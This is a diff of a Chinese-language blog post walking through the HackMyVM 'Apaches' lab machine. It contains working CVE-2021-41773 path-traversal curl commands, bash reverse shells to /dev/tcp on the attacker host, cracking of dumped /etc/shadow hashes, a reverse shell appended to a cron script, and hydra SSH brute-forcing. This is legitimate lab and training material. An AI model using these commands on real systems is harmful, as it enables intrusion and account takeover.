@@ -124,13 +124,13 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>hmv_Apaches</h1>
 <h1>0. 简介</h1>
-<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=Apaches">hackmyvm - Apaches</a>
-<strong>难度</strong>：绿色
-<strong>目标 IP</strong>：192.168.205.143
+<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=Apaches" rel="nofollow">hackmyvm - Apaches</a><br>
+<strong>难度</strong>：绿色<br>
+<strong>目标 IP</strong>：192.168.205.143<br>
 <strong>本机 IP</strong>：192.168.205.141</p>
 <h1>1. 扫描</h1>
-<p>首先，通过 <code>nmap</code> 对靶机进行全端口扫描，检查开放端口和服务：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
+<p>首先，通过 <code class="notranslate">nmap</code> 对靶机进行全端口扫描，检查开放端口和服务：</p>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 13:58 CST
 Nmap scan report for 192.168.205.143
@@ -143,8 +143,8 @@ MAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 </code></pre>
 <p>从扫描结果可以看到，靶机开启了 <strong>SSH</strong> 和 <strong>HTTP</strong> 服务。接下来，我们对 HTTP 服务进行进一步的渗透测试。</p>
 <h1>2. 漏洞扫描与利用</h1>
-<p>通过访问 Web 服务，未发现明显的漏洞。因此，我使用 <strong>feroxbuster</strong> 对靶机进行目录爆破，虽然未获得有效的目录列表，但继续使用 <code>nuclei</code> 工具对靶机进行漏洞扫描，最终发现了一个高危漏洞：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
+<p>通过访问 Web 服务，未发现明显的漏洞。因此，我使用 <strong>feroxbuster</strong> 对靶机进行目录爆破，虽然未获得有效的目录列表，但继续使用 <code class="notranslate">nuclei</code> 工具对靶机进行漏洞扫描，最终发现了一个高危漏洞：</p>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nuclei -u 192.168.205.143
 ...
 [INF] Running httpx on input host
@@ -154,13 +154,13 @@ MAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 ...
 </code></pre>
 <p>该漏洞为 <strong><a href="https://github.com/LudovicPatho/CVE-2021-41773">CVE-2021-41773</a></strong>，是 Apache HTTP 服务器的目录遍历漏洞，能够通过访问特定路径执行命令。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ curl 'http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type:text/plain; echo; id'
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 </code></pre>
 <p>执行成功后，获取了靶机的基本信息，进一步确认漏洞有效。现在我们执行反弹shell。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
-└─$ curl 'http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type:text/plain; echo; bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1&quot;'
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl 'http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type:text/plain; echo; bash -c "bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1"'
 
 #kali
 ┌──(kali㉿kali)-[~/test]
@@ -175,7 +175,7 @@ uid=1(daemon) gid=1(daemon) groups=1(daemon)
 </code></pre>
 <h1>3. 获取稳定的 Shell</h1>
 <p>为了获取一个更加稳定的交互式 shell，执行以下命令：</p>
-<pre lang="bash"><code>script /dev/null -c bash  
+<pre lang="bash" class="notranslate"><code class="notranslate">script /dev/null -c bash  
 ctrl+z  
 stty raw -echo; fg  
 reset xterm  
@@ -186,7 +186,7 @@ stty rows 59 cols 236
 </code></pre>
 <p>这些操作确保了与靶机的连接更为稳定，并为后续的渗透操作提供了良好的基础。</p>
 <h1>4.提权</h1>
-<pre lang="bash"><code>daemon@apaches:/usr/bin$ cd /home/
+<pre lang="bash" class="notranslate"><code class="notranslate">daemon@apaches:/usr/bin$ cd /home/
 daemon@apaches:/home$ ls -al
 total 24
 drwxr-xr-x  6 root       root       4096 Oct  9  2022 .
@@ -373,8 +373,8 @@ pocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN
 ═╣ Can I write in network-scripts? ...... No                                                                                       
 ═╣ Can I read root folder? .............. No                   
 </code></pre>
-<p>我去......我是没想到它<code>/etc/shadow</code>是可读的。我们将数据提取出来爆破</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
+<p>我去......我是没想到它<code class="notranslate">/etc/shadow</code>是可读的。我们将数据提取出来爆破</p>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ cat hash
 geronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
 squanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
@@ -390,12 +390,12 @@ Will run 12 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 iamtheone        (squanto)   
 1g 0:00:02:02 6.84% (ETA: 14:47:27) 0.008181g/s 9123p/s 27696c/s 27696C/s 14032519..1234victor
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Use the "--show" option to display all of the cracked passwords reliably
 Session aborted
 
 </code></pre>
 <p>我们登录上去，继续提权</p>
-<pre lang="bash"><code>squanto@apaches:/home/sacagawea$ id
+<pre lang="bash" class="notranslate"><code class="notranslate">squanto@apaches:/home/sacagawea$ id
 uid=1001(squanto) gid=1001(squanto) groups=1001(squanto),1004(Lipan)
 squanto@apaches:/home/sacagawea$ find / -group Lipan 2&gt;/dev/null
 /home/sacagawea/Scripts/backup.sh
@@ -413,7 +413,7 @@ tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
 chmod 700 /home/sacagawea/Backup/Backup.tar.gz
 </code></pre>
 <p>有一个脚本文件，看着就像定时任务，而且我们可以修改，我们加个反弹shell上去</p>
-<pre lang="bash"><code>squanto@apaches:/home/sacagawea/Scripts$ echo &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1'&quot; &gt;&gt; backup.sh 
+<pre lang="bash" class="notranslate"><code class="notranslate">squanto@apaches:/home/sacagawea/Scripts$ echo "bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1'" &gt;&gt; backup.sh 
 squanto@apaches:/home/sacagawea/Scripts$ cat backup.sh 
 #!/bin/bash
 
@@ -423,7 +423,7 @@ chmod 700 /home/sacagawea/Backup/Backup.tar.gz
 bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1'
 </code></pre>
 <p>我们稍等片刻</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 8889                                
 listening on [any] 8889 ...
 id
@@ -434,7 +434,7 @@ sacagawea@apaches:~$ id
 uid=1002(sacagawea) gid=1002(sacagawea) groups=1002(sacagawea),1004(Lipan)
 </code></pre>
 <p>继续提权</p>
-<pre lang="bash"><code>sacagawea@apaches:~$ cd Development/
+<pre lang="bash" class="notranslate"><code class="notranslate">sacagawea@apaches:~$ cd Development/
 sacagawea@apaches:~/Development$ ls
 ls
 admin
@@ -457,34 +457,34 @@ sacagawea@apaches:~/Development/admin$ cat 2-check.php
 session_start();
 
 // (B) HANDLE LOGIN
-if (isset($_POST[&quot;user&quot;]) &amp;&amp; !isset($_SESSION[&quot;user&quot;])) {
+if (isset($_POST["user"]) &amp;&amp; !isset($_SESSION["user"])) {
   // (B1) USERS &amp; PASSWORDS - SET YOUR OWN !
   $users = [
-    &quot;geronimo&quot; =&gt; &quot;12u7D9@4IA9uBO4pX9#6jZ3456&quot;,
-    &quot;pocahontas&quot; =&gt; &quot;y2U1@8Ie&amp;OHwd^Ww3uAl&quot;,
-    &quot;squanto&quot; =&gt; &quot;4Rl3^K8WDG@sG24Hq@ih&quot;,
-    &quot;sacagawea&quot; =&gt; &quot;cU21X8&amp;uGswgYsL!raXC&quot;
+    "geronimo" =&gt; "12u7D9@4IA9uBO4pX9#6jZ3456",
+    "pocahontas" =&gt; "y2U1@8Ie&amp;OHwd^Ww3uAl",
+    "squanto" =&gt; "4Rl3^K8WDG@sG24Hq@ih",
+    "sacagawea" =&gt; "cU21X8&amp;uGswgYsL!raXC"
   ];
 
   // (B2) CHECK &amp; VERIFY
-  if (isset($users[$_POST[&quot;user&quot;]])) {
-    if ($users[$_POST[&quot;user&quot;]] == $_POST[&quot;password&quot;]) {
-      $_SESSION[&quot;user&quot;] = $_POST[&quot;user&quot;];
+  if (isset($users[$_POST["user"]])) {
+    if ($users[$_POST["user"]] == $_POST["password"]) {
+      $_SESSION["user"] = $_POST["user"];
     }
   }
 
   // (B3) FAILED LOGIN FLAG
-  if (!isset($_SESSION[&quot;user&quot;])) { $failed = true; }
+  if (!isset($_SESSION["user"])) { $failed = true; }
 }
 
 // (C) REDIRECT USER TO HOME PAGE IF SIGNED IN
-if (isset($_SESSION[&quot;user&quot;])) {
-  header(&quot;Location: index.php&quot;);
+if (isset($_SESSION["user"])) {
+  header("Location: index.php");
   exit();
 }
 </code></pre>
 <p>发现了几组用户和密码，我们尝试利用其爆破ssh</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ cat user              
 geronimo
 pocahontas
@@ -508,7 +508,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 14:32:
 
 </code></pre>
 <p>我们通过ssh连接上去（建议这样连接，不要要上一个用户切用户，不然它sudo会报错）</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ ssh pocahontas@192.168.205.143
 
 pocahontas@apaches:~$ sudo -l
@@ -518,15 +518,14 @@ Matching Defaults entries for pocahontas on apaches:
 User pocahontas may run the following commands on apaches:
     (geronimo) /bin/nano
 </code></pre>
-<p><img src="https://github.com/user-attachments/assets/ddc1fb60-c726-483a-a3eb-5afdd9bf9a3e" alt="Image" /></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ddc1fb60-c726-483a-a3eb-5afdd9bf9a3e"><img src="https://github.com/user-attachments/assets/ddc1fb60-c726-483a-a3eb-5afdd9bf9a3e" alt="Image" style="max-width: 100%;"></a></p>
 <p>可以使用<strong>sudo nano</strong>，我们进行提权</p>
-<pre lang="bash"><code>pocahontas@apaches:~$ sudo -u geronimo /bin/nano
+<pre lang="bash" class="notranslate"><code class="notranslate">pocahontas@apaches:~$ sudo -u geronimo /bin/nano
 $ bash
 geronimo@apaches:/home/pocahontas$ sudo bash -p
 root@apaches:/home/pocahontas# id
 uid=0(root) gid=0(root) groups=0(root)
-</code></pre>
-</div>
+</code></pre></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
